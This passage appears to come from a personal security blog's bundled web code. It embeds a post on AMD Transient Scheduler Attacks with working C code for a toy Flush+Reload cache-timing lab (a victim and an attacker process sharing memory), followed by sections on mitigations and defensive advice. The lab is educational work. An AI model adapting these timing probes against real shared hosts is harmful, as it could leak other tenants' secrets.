    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-smi">uint64_t</span> <span class="pl-en">time_access_ns</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();

    <span class="pl-k">return</span> <span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>;
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x05</span>;

    <span class="pl-c">// Simple multiple trials to average timing</span>
    <span class="pl-k">const</span> <span class="pl-smi">int</span> <span class="pl-s1">trials</span> <span class="pl-c1">=</span> <span class="pl-c1">50</span>;

    <span class="pl-c">// prime+victim</span>
    <span class="pl-en">flush_probe_array</span>();
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT64_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">total</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>;
        <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">trials</span>; <span class="pl-s1">t</span><span class="pl-c1">++</span>) {
            <span class="pl-s1">total</span> <span class="pl-c1">+=</span> <span class="pl-en">time_access_ns</span>(<span class="pl-s1">idx</span>);
        }
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">avg</span> <span class="pl-c1">=</span> <span class="pl-s1">total</span> / <span class="pl-s1">trials</span>;

        <span class="pl-k">if</span> (<span class="pl-s1">avg</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">avg</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (avg time = %llu ns)\\n"</span>,
           <span class="pl-s1">best_idx</span>, (<span class="pl-smi">unsigned long long</span>)<span class="pl-s1">best_time</span>);

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This looks similar to the timing setups in CPU side-channel courses and Spectre labs, where you average many samples to separate cache hits from misses.</p>
<div class="markdown-heading"><h3 class="heading-element">4.3 Splitting victim and attacker (two processes, shared memory)</h3><a id="user-content-43-splitting-victim-and-attacker-two-processes-shared-memory" class="anchor" aria-label="Permalink: 4.3 Splitting victim and attacker (two processes, shared memory)" href="#43-splitting-victim-and-attacker-two-processes-shared-memory"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>To make the lab feel more like a <strong>cross-process leak</strong> (closer to TSA’s “other context” threat model), you can separate victim and attacker into <strong>two processes</strong> that share memory via <code>shm_open</code> / <code>mmap</code>.</p>
<p><strong>Shared header:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// common.h</span>
<span class="pl-k">#pragma</span> once
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> {
    <span class="pl-smi">uint8_t</span> <span class="pl-c1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">stop</span>;      <span class="pl-c">// flag to tell victim to stop</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">ready</span>;     <span class="pl-c">// flag for simple sync</span>
};</pre></div>
<p><strong>Victim process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// victim.c</span>
<span class="pl-c">// gcc -O2 -march=native -o victim victim.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>

<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x7F</span>;

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span> | <span class="pl-c1">O_CREAT</span>, <span class="pl-c1">0600</span>);
    <span class="pl-en">ftruncate</span>(<span class="pl-s1">fd</span>, <span class="pl-k">sizeof</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span>));
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Initialize</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span>) {
        <span class="pl-c">// attacker_hint could be communicated via shared memory too;</span>
        <span class="pl-c">// here we just fix it for simplicity</span>
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x11</span>;
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
        <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
        __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
    }

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p><strong>Attacker process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// attacker.c</span>
<span class="pl-c">// gcc -O2 -march=native -o attacker attacker.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span>, <span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned</span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span>, <span class="pl-c1">0600</span>);
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Wait for victim to init</span>
    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span>) { }

    <span class="pl-c">// Flush cache lines first</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }

    <span class="pl-c">// Give victim some time to run and "prime" one line</span>
    <span class="pl-en">usleep</span>(<span class="pl-c1">10000</span>);

    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">sh</span>, <span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index (cross-proc) = %d, time = %u cycles\\n"</span>,
           <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Tell victim to stop</span>
    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This is closer in spirit to <strong>“victim in one context, attacker in another”</strong>, even though they’re still on the same OS and sharing memory explicitly. Real TSA removes that explicit sharing: instead of a shared array, the “shared state” is the CPU’s internal scheduler, store queue, and L1 cache.</p>
<div class="markdown-heading"><h3 class="heading-element">4.4 Connecting the lab back to TSA</h3><a id="user-content-44-connecting-the-lab-back-to-tsa" class="anchor" aria-label="Permalink: 4.4 Connecting the lab back to TSA" href="#44-connecting-the-lab-back-to-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Right after these code sections, the key takeaway is:</p>
<ul>
<li>
<p>Our toy lab uses <strong>cache presence</strong> as the side-channel signal (classic Flush+Reload / Prime+Probe).</p>
</li>
<li>
<p>TSA uses <strong>scheduler timing</strong> as the side-channel signal:</p>
<ul>
<li>False completions → invalid data forwarded → different dependency chains → different timing.</li>
</ul>
</li>
<li>
<p>In both cases, the attacker:</p>
<ol>
<li>
<strong>Influences</strong> microarchitectural state (priming),</li>
<li>Lets a victim touch secret-dependent data (access pattern),</li>
<li>Measures a <strong>timing difference</strong> in its own code,</li>
<li>Reconstructs bits of the secret over many trials.</li>
</ol>
</li>
</ul>
<p>That’s the mental bridge you want readers to cross.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">5. Mitigations: what AMD, OSs, and clouds are doing</h2><a id="user-content-5-mitigations-what-amd-oss-and-clouds-are-doing" class="anchor" aria-label="Permalink: 5. Mitigations: what AMD, OSs, and clouds are doing" href="#5-mitigations-what-amd-oss-and-clouds-are-doing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA mitigations span firmware, OS, and virtualization layers.</p>
<div class="markdown-heading"><h3 class="heading-element">5.1 Microcode + VERW</h3><a id="user-content-51-microcode--verw" class="anchor" aria-label="Permalink: 5.1 Microcode + VERW" href="#51-microcode--verw"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD ships updated <strong>microcode</strong> for vulnerable Family 19h CPUs. On top of that, they recommend using the memory form of the <code>VERW</code> instruction as a “microarchitectural scrub”:</p>
<ul>
<li>New CPUID bits tell software:
<ul>
<li>Whether TSA-L1 / TSA-SQ are not present,</li>
<li>Whether the CPU supports TSA mitigation via <code>VERW_CLEAR</code>.</li>
</ul>
</li>
<li>With appropriate microcode loaded, <strong>CPL0 (kernel / hypervisor)</strong> can execute <code>VERW</code> to clear TSA-relevant structures when crossing trust boundaries, e.g.:
<ul>
<li>Kernel → user transitions,</li>
<li>Hypervisor → guest VM transitions,</li>
<li>Before entering low-power states.</li>
</ul>
</li>
</ul>
<p>This is similar in spirit to existing post-Spectre mitigations (IBPB, STIBP, etc.) but targeted at scheduler structures.</p>
<div class="markdown-heading"><h3 class="heading-element">5.2 Linux <code>MITIGATION_TSA</code> and <code>tsa=</code> knob</h3><a id="user-content-52-linux-mitigation_tsa-and-tsa-knob" class="anchor" aria-label="Permalink: 5.2 Linux MITIGATION_TSA and tsa= knob" href="#52-linux-mitigation_tsa-and-tsa-knob"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Linux added explicit support for TSA mitigations:</p>
<ul>
<li>A new Kconfig option <code>MITIGATION_TSA</code> gates TSA-related logic.</li>
<li>A boot parameter <code>tsa=</code> controls behavior (e.g., always on, only for user/kernel transitions, only guest/host transitions, or disabled).</li>
<li>Combined with updated microcode from <code>linux-firmware</code>, this lets distros tune performance vs security trade-offs depending on threat model.</li>
</ul>
<div class="markdown-heading"><h3 class="heading-element">5.3 SEV-SNP and attestation</h3><a id="user-content-53-sev-snp-and-attestation" class="anchor" aria-label="Permalink: 5.3 SEV-SNP and attestation" href="#53-sev-snp-and-attestation"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>For AMD’s <strong>SEV-SNP</strong> (encrypted VM) environments:</p>
<ul>
<li>TSA could, in principle, allow a malicious hypervisor to infer SEV-SNP guest data.</li>
<li>Microcode and firmware updates aim to automatically mitigate TSA for SEV-SNP guests.</li>
<li>Guest owners are expected to:
<ul>
<li>Verify via <strong>attestation</strong> that the host is running the right microcode,</li>
<li>Confirm that TSA mitigations are active before trusting the platform.</li>
</ul>
</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">6. What red teams and blue teams should actually do</h2><a id="user-content-6-what-red-teams-and-blue-teams-should-actually-do" class="anchor" aria-label="Permalink: 6. What red teams and blue teams should actually do" href="#6-what-red-teams-and-blue-teams-should-actually-do"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<div class="markdown-heading"><h3 class="heading-element">6.1 For red teams</h3><a id="user-content-61-for-red-teams" class="anchor" aria-label="Permalink: 6.1 For red teams" href="#61-for-red-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA probably won’t be your <strong>first</strong> move in a real engagement, but it’s worth understanding as part of a modern attack surface:</p>
<ul>
<li>
<strong>Model it as a capability</strong>:
<ul>
<li>“Given local code execution on a shared AMD Zen 3/4 host, I may be able to leak bits of privileged data over time.”</li>
</ul>
</li>
<li>
<strong>Think in campaigns, not single shots</strong>:
<ul>
<li>Meeting the timing conditions and noise requirements means you want long-lived footholds and repeated victim activity.</li>
</ul>
</li>
<li>
<strong>Use it to stress test cloud models</strong>:
<ul>
<li>Ask: “If I’m a rogue tenant on this EPYC host, what’s the maximum <em>theoretical</em> data I can extract from neighbors?”</li>
</ul>
</li>
</ul>
<p>TSA is a great hook for talks and blogs because it forces teams to think beyond “network perimeter” and even beyond “syscall boundary.” The CPU itself is part of the threat surface.</p>
<div class="markdown-heading"><h3 class="heading-element">6.2 For blue teams</h3><a id="user-content-62-for-blue-teams" class="anchor" aria-label="Permalink: 6.2 For blue teams" href="#62-for-blue-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Concrete actions:</p>
<ol>
<li>
<p><strong>Patch like this is Meltdown-class, not just ‘medium CVSS’</strong></p>
<ul>
<li>Make sure:
<ul>
<li>Firmware/microcode is up to date for all Family 19h platforms,</li>
<li>OS / hypervisor builds include TSA mitigations and have <code>tsa=</code> configured appropriately.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Re-evaluate your multi-tenant risk</strong></p>
<ul>
<li>In clouds and shared hosting:
<ul>
<li>Understand which SKUs are affected,</li>
<li>Decide whether you treat TSA as an academic curiosity or something you must mitigate for specific tenants (e.g., high-sensitivity workloads).</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Include TSA in your threat modeling</strong></p>
<ul>
<li>It’s an <strong>info-leak primitive</strong>, not an RCE.</li>
<li>Combine it mentally with other bugs:
<ul>
<li>RCE → TSA → secret exfiltration → crypto break → lateral movement.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Watch for performance regressions</strong></p>
<ul>
<li>VERW-based mitigations may hurt performance; you’ll need to benchmark and possibly make different choices per environment (internal dev vs multi-tenant cloud vs regulated workloads).</li>
</ul>
</li>
</ol>
<hr>
<div class="markdown-heading"><h2 class="heading-element">7. Further reading</h2><a id="user-content-7-further-reading" class="anchor" aria-label="Permalink: 7. Further reading" href="#7-further-reading"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>If you want to go deeper than this blog, here’s a good starting stack:</p>
<ul>
<li>AMD’s <strong>Transient Scheduler Attacks</strong> (TSA) security bulletin and technical guidance.</li>
<li>Linux kernel docs / Phoronix coverage for <code>MITIGATION_TSA</code> and the <code>tsa=</code> boot knob.</li>
<li>Research papers on speculative and transient execution attacks (Spectre, Meltdown, Zenbleed, Inception, Medusa, etc.).</li>
<li>AMD and academic work on automated discovery of microarchitectural leaks and isolation-boundary testing.</li>
</ul>
<p>These will give you both the official narrative and the gritty experimental details behind TSA.</p>
<hr>
<p><em>Again: everything here is for learning and for defending modern systems. Don’t point side-channel experiments at machines you don’t own or control, and assume that anything that can leak data can also get you in trouble if you use it irresponsibly.</em></p>
`,rm={firmware_llm_annotator:{title:"Firmware Exploration: LLM as Your Annotator",slug:"firmware_llm_annotator",content:Jf},transient_scheduler_attacks_tsa_blog:{title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",slug:"transient_scheduler_attacks_tsa_blog",content:sm},1001:{title:"CVE-2024–1001",slug:"1001",content:Yf},"0012":{title:"CVE-2024–0012",slug:"0012",content:Gf},40982:{title:"CVE-2022–40982",slug:"40982",content:Zf},cow:{title:"CVE-2016–5195",slug:"cow",content:Xf},symlinks:{title:"Symbolic Links (Symlinks) in Linux",slug:"symlinks",content:tm},23397:{title:"CVE-2023–23397",slug:"23397",content:qf},"0160":{title:"CVE-2014-0160",slug:"0160",content:Qf},11882:{title:"CVE-2017-11882",slug:"11882",content:Kf},robot:{title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",slug:"robot",content:nm},poodle:{title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",slug:"poodle",content:em}};function am(e){try{const t=new DOMParser().parseFromString(e,"text/html"),s=["style","script","link","nav","header","footer",".navbar",".nav-container",".theme-toggle",".footer",".social-links",".social-icons"];t.querySelectorAll(s.join(",")).forEach(i=>i.remove()),t.querySelectorAll("[style]").forEach(i=>i.removeAttribute("style"));const r=t.querySelector("h1");r&&r.remove();const a=[".blog-text","article",".blog-post-content","main"];let l=t.body;for(const i of a){const o=t.querySelector(i);if(o){l=o;break}}return l.querySelectorAll(".container").forEach(i=>{for(;i.firstChild;)i.parentNode.insertBefore(i.firstChild,i);i.remove()}),Array.from(l.querySelectorAll("h2, h3")).forEach((i,o)=>{i.id||(i.id=`section-${o+1}`)}),l.innerHTML||e}catch{return e}}function lm(){const{slug:e}=Jh(),n=rm[e],t=tl.find(a=>a.slug===e),s=x.useMemo(()=>n?am(n.content):"",[n]),r=()=>document.body.classList.contains("dark")?"dark":"light";return x.useEffect(()=>{const a=document.querySelector(".giscus-container");if(!a)return;a.innerHTML="";const l=document.createElement("script");return l.src="https://giscus.app/client.js",l.async=!0,l.crossOrigin="anonymous",l.setAttribute("data-giscus","true"),l.setAttribute("data-repo","Hem1700/hem1700.github.io"),l.setAttribute("data-repo-id","R_kgDONilgZg"),l.setAttribute("data-category","General"),l.setAttribute("data-category-id","DIC_kwDONilgZs4CzSR2"),l.setAttribute("data-mapping","pathname"),l.setAttribute("data-strict","1"),l.setAttribute("data-reactions-enabled","1"),l.setAttribute("data-emit-metadata","0"),l.setAttribute("data-input-position","top"),l.setAttribute("data-lang","en"),l.setAttribute("data-theme",r()),a.appendChild(l),()=>{a.innerHTML=""}},[e]),x.useEffect(()=>{const a=()=>{var o;const i=document.querySelector("iframe.giscus-frame");i&&((o=i.contentWindow)==null||o.postMessage({giscus:{setConfig:{theme:r()}}},"https://giscus.app"))},l=new MutationObserver(a);return l.observe(document.body,{attributes:!0,attributeFilter:["class"]}),a(),()=>l.disconnect()},[]),n?c.jsxs(c.Fragment,{children:[c.jsx("header",{className:"blog-post-header",children:c.jsxs("div",{className:"container text-center",children:[c.jsx("h1",{className:"blog-post-title",children:n.title}),t&&c.jsxs("p",{className:"blog-post-date",children:[t.date," · ",t.readTime]})]})}),c.jsxs("main",{className:"blog-post-content container",children:[c.jsx("article",{dangerouslySetInnerHTML:{__html:s}}),c.jsx("section",{className:"comments",children:c.jsx("div",{className:"container",children:c.jsx("div",{className:"giscus-container"})})})]})]}):c.jsxs("main",{className:"blog-post-content container",children:[c.jsx("h2",{children:"Post not found"}),c.jsx("p",{children:"Looks like Toby was here. Let’s go back."}),c.jsx(Ue,{to:"/blogs",className:"view-credentials",children:"Back to Blog"})]})}const im=["All","Security Tools","Research","Web","Desktop","Cloud","Automation"];function om({activeFilter:e,onFilterChange:n}){return c.jsx("div",{className:"filter-chips",children:im.map(t=>c.jsx("button",{className:`chip ${t===e?"active":""}`,type:"button",onClick:()=>n(t),children:t},t))})}function cm({items:e}){const[n,t]=x.useState(0);if(!(e!=null&&e.length))return null;const s=e[n],r=()=>t(l=>(l+1)%e.length),a=()=>t(l=>(l-1+e.length)%e.length);return c.jsxs("div",{className:"featured-carousel",children:[c.jsxs("div",{className:"featured-card",children:[c.jsxs("div",{className:"featured-meta",children:[c.jsx("span",{className:"pill",children:"Featured"}),s.tag&&c.jsx("span",{className:"pill",children:s.tag})]}),c.jsx("h3",{children:s.title}),c.jsx("p",{children:s.description}),c.jsx("div",{className:"project-tags",children:(s.tags||[]).map(l=>c.jsx("span",{className:"pill",children:l},l))}),c.jsx("div",{className:"featured-actions",children:c.jsx("a",{href:s.href,target:"_blank",rel:"noreferrer",className:"link-button",children:"View"})})]}),e.length>1&&c.jsxs("div",{className:"featured-controls",children:[c.jsx("button",{type:"button",onClick:a,className:"button ghost",children:"←"}),c.jsx("button",{type:"button",onClick:r,className:"button ghost",children:"→"})]})]})}function um({items:e,showViewAll:n=!1,showHeader:t=!0}){const[s,r]=x.useState("All"),[a,l]=x.useState(1),i=4,o=e.slice(0,2),u=x.useMemo(()=>s==="All"?e:e.filter(v=>{var k;return(k=v.tags)==null?void 0:k.some(w=>w.toLowerCase().includes(s.toLowerCase().split(" ")[0]))}),[s,e]),g=Math.max(1,Math.ceil(u.length/i)),f=u.slice((a-1)*i,a*i),m=v=>{r(v),l(1)};return c.jsx("section",{className:"projects",id:"projects",children:c.jsxs("div",{className:"container",children:[t&&c.jsxs("div",{className:"section-header",children:[c.jsxs("div",{children:[c.jsx("h2",{className:"section-title",children:"Projects"}),c.jsx("p",{className:"section-subtitle",children:'Quarterly Projects Report — "I am Beyoncé, always."'})]}),n&&c.jsx("div",{className:"section-actions",children:c.jsx(Ue,{className:"link-button",to:"/projects",children:"View all 